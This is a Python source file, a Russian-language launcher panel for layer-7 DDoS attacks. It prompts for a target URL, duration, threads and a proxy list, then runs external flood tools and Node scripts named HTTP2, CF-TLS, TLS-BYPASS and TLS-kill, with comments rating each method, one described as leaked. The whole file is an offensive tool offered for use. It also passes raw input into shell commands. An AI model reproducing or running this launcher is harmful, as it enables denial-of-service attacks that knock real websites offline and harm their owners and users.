
import subprocess
import os
from os import name, system

if name == 'nt':
    system("  HTTP2 атака))")
    system("mode 101, 30")


def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)


def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)


def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("""
      _  _______ ____  ______ _____   ____  _   _ ______ 
 | |/ /_   _|  _ \|  ____|  __ \ / __ \| \ | |  ____|
 | ' /  | | | |_) | |__  | |__) | |  | |  \| | |__   
 |  <   | | |  _ <|  __| |  _  /| |  | | . ` |  __|  
 | . \ _| |_| |_) | |____| | \ \| |__| | |\  | |____ 
 |_|\_\_____|____/|______|_|  \_\\____/|_| \_|______|
                                                     
                                                 
    """)

    print()
    print("============= методы layer7 ============")
    print("  ==> Golang")
    print("  [1] - HTTPdestroy-так себе но можно попробовать")
    print("  [2] - StresserUS - слитый метод")
    print("  ==> Nodejs")
    print("  [3] - HTTP2 - отличное")
    print("  [4] - CF-TLS-для мэш самое то")
    print("  [5] - CFS-говно")
    print("  [6] - TLS-BYPASS-норм")
    print("  [7] - TLS-kill - норм")
    print("  [0] - выйти")
    print("=========================================")


def handle_menu_selection(selection):
    if selection == '1':
        print("\n============== HTTPdestroy ==============")
        target = input("   введи цель атаки (url): ")
        time = input("  введи время атаки: ")
        requests = input("  введи запрос атаки на айпи: ")
        thread = input("  введи кол-во пакетов: ")
        proxy_file = input("  введи прокси файл(proxy.txt): ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== HTTPdestroy ==============")
        print(f"  инфа о твоей атаке")
        print(f"  цель: {target}")
        print(f"  время: {time}")
        print(f"  запрос на айпи: {requests}")
        print(f"  пакеты: {thread}")
        print(f"  прокси файл: {proxy_file}")
        print("=========================================")
        input("  начать атаку (Enter)\n")
        os.system(f"chmod 777 httpdestroy")
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во твоих проксей: {proxy_count}")
        os.system(f"./httpdestroy {target} {time} {requests} {thread} {proxy_file}")

    elif selection == '2':
        print("\n=============== StresserUS ==============")
        target = input("  введи цель: ")
        limit = input("  введи рейт лимит(1): ")
        time = input("  время введи ")
        proxy_file = input("  введи прокси файл (proxy.txt) ")
        thread = input("    введи кол-во пакетов: ")
        mode = input("  введи мод")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== StresserUS ==============")
        print(f"  инфа о атаке")
        print(f"  цель: {target}")
        print(f"  рейт - лимит: {limit}")
        print(f"  время: {time}")
        print(f"  файл прокси: {proxy_file}")
        print(f"  пакеты: {thread}")
        print(f"  мод: {mode}")
        print("=========================================")
        input("  нажми ентер для начала атаки (Enter)\n")
        os.system(f"chmod +x StresserUS")
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во прокси: {proxy_count}")
        os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={mode}")
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>

    elif selection == '3':
        print("\n================= HTTP2 =================")
        target = input("  введи цель: ")
        time = input("  введи время: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= HTTP2 =================")
        print(f"  инфа о атаке")
        print(f"  цель: {target}")
        print(f"  время: {time}")
        print()
        print(f"  инфа по умолчанию")
        print(f"  файл прокси: proxy.txt")
        print(f"  файл юзерагентов: ua.txt")
        print("=========================================")
        input("  для начала атаки нажмите Enter (Enter)\n")
        proxy_file = "proxy.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во прокси: {proxy_count}")
        run_script('HTTP2.js', [target, time])

    elif selection == '4':
        print("\n================= CF-TLS ================")
        target = input("  цель: ")
        time = input("  время: ")
        thread = input("  пакеты: ")
        proxy_file = input("  прокси: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= CF-TLS ================")
        print(f"  инфа о атаке")
        print(f"  цель: {target}")
        print(f"  время: {time}")
        print(f"  пакеты: {thread}")
        print(f"  прокси-файл: {proxy_file}")
        print("=========================================")
        input("  что начать атаку нажмите Enter (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во прокси: {proxy_count}")
        run_script('CF-TLS.js', [target, time, thread, proxy_file])

    elif selection == '5':
        print("\n================== CFS ==================")
        target = input(" цель: ")
        time = input("  время: ")
        thread = input("  пакеты: ")
        mode = input("  мод: ")
        proxy_file = input("  файл прокси: ")
        requests = input("  запрос на айпи: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== CFS ==================")
        print(f"  инфа о атаке")
        print(f"  цель: {target}")
        print(f"  время: {time}")
        print(f"  пакеты: {thread}")
        print(f"  мод: {mode}")
        print(f"  файл-прокси: {proxy_file}")
        print(f"  запрос на айпи: {requests}")
        print("=========================================")
        input("  чтобы начать атаку нажмите Enter (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во прокси: {proxy_count}")
        print(f"\n  атака")
        print(f"  программа норм работает не очкуй\n")
        run_script('CFS.js', [target, time, thread, mode, proxy_file, requests])

    elif selection == '6':
        print("\n=============== TLS-BYPASS ==============")
        target = input("  цель: ")
        time = input("  время: ")
        thread = input(" пакеты: ")
        proxy_file = input("  прокси файл: ")
        requests = input("  запрос на айпи: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== TLS-BYPASS ==============")
        print(f"  инфа о атаке")
        print(f"  пакеты: {target}")
        print(f"  время: {time}")
        print(f"  пакеты: {thread}")
        print(f"  прокси файл: {proxy_file}")
        print(f"  запрос на айпи: {requests}")
        print("=========================================")
        input("  чтобы начать атаку нажми enter (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  кол-во прокси: {proxy_count}")
        print(f"\n  атака запущена")
        print(f"  все работает не очкуй\n")
        run_script('TLS-BYPASS.js', [target, time, thread, proxy_file, requests])

    elif selection == '7':
        print("\n================ TLS-kill ===============")
        target = input("  цель: ")
        thread = input("  пакеты: ")
        requests = input(" запрос на айпи: ")
        mode = input("  мод: ")
        time = input("  время time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ TLS-kill ================")
        print(f"  инфа о атаке")
        print(f"  цель: {target}")
        print(f"  пакеты: {thread}")
        print(f"  запрос на айпи: {requests}")
        print(f"  мод: {mode}")
        print(f"  время: {time}")
        print()
        print(f"  инфа по умолчанию")
        print(f"  прокси: http.txt")
        print(f"  юзерагенты: ua.txt")
        print("==========================================")
        input("  чтобы начать атаку нажмите Enter (Enter)\n")
        proxy_file = "http.txt"
        proxy_count = count_proxy(proxy_file)
        print(f" кол-во прокси: {proxy_count}")
        print(f"\n  атака")
        print(f"  програма норм работает, не очкуй\n")
        run_script('TLS-kill.js', [target, thread, requests, mode, time])

    else:
        print("  недопустимый параметр")


def start_panel():
    while True:
        show_menu()
        selection = input("  выбери метод атаки ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
            print("  выбери норм цифру.")
            continue
        
        handle_menu_selection(selection)


start_panel()


